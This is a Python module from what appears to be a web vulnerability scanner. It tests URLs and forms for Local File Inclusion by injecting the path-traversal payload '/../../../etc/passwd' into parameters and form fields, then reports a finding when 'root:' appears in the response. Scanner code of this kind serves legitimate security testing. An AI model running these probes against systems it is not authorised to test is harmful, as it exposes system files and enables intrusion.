import re

from werkzeug.exceptions import InternalServerError

from Classes.ScanConfig import ScanConfig
from Classes.Utilities import Utilities
from CustomImports import html_report


#TODO: Add more payloads LFI/RFI

def t_i_lfi(url):
    try:
        # for html_payload in self.DataStorage.payloads("HTML"):
        lfi_script = '/../../../etc/passwd'
        if '=' in url:
            try:
                new_url = re.sub(r'=(?!.*=).*$', f'={lfi_script}', url)
                if ScanConfig.session.get(new_url):
                    if "root:" in ScanConfig.session.get(new_url).text.lower():
                        return lfi_script, new_url
            except InternalServerError:
                pass
        form_list, form_data_list = Utilities.extract_forms_and_form_data(url)
        if not (form_list or form_data_list):
            return None, None
        for index, form in enumerate(form_list):
            injection_keys = Utilities.extract_injection_fields_from_form(form_data_list[index])
            # for html_payload in self.DataStorage.payloads("HTML"):
            lfi_script = '/../../../etc/passwd'
            # Inject each payload into each injection point
            for injection_key in injection_keys:
                form_data_list[index][injection_key] = lfi_script
            response_injected = Utilities.submit_form(url, form, form_data_list[index])
            if not response_injected:
                return None, None
            if "root:" in response_injected.text.lower():
                forms, form_data = Utilities.extract_from_html_string('form', response_injected.text)
                return lfi_script, forms
        return None, None
    except Exception as e:
        Utilities.print_except_message('error', e, "Something went wrong when testing for Local File Inclusion (LFI).", url)
        pass


def run(url):
    try:
        lfi_script, form_response_list_or_url = t_i_lfi(url)
        if lfi_script:
            if type(form_response_list_or_url) == list:
                lfi_script, form_response_list = Utilities.escape_string_html(form_response_list_or_url, lfi_script)
                html_report.add_vulnerability('Local File Inclusion (LFI)',
                                              'Local File Inclusion (LFI) vulnerability identified on URL: {}'.format(url),
                                              'High', payload=lfi_script, reply="\nResponse Form: {}.".format(form_response_list), comment="Successfully used the above payload to perform Local File Inclusion (LFI).")
            else:
                new_url = form_response_list_or_url
                html_report.add_vulnerability('Local File Inclusion (LFI)',
                                              'Local File Inclusion (LFI) vulnerability identified on URL: {}'.format(
                                                  url),
                                              'High', payload=lfi_script,
                                              reply="\nURL: {}.".format(new_url),
                                              comment="Successfully used the above payload to perform Local File Inclusion (LFI) in the URL.")

        return
    except Exception as e:
        Utilities.print_except_message('error', e, "Something went wrong when testing for Local File Inclusion (LFI).", url)
        pass